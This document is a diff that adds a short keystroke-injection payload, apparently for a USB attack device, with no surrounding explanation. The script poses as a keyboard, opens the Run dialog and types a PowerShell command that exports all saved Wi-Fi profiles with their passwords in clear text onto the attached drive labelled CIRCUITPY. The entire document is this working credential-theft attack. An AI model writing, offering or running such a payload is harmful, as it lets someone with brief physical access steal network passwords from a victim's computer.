@@ -1,0 +1,6 @@
+ATTACKMODE HID STORAGE
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell "$m=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter;netsh wlan export profile folder=${m}:\ key=clear"
+ENTER
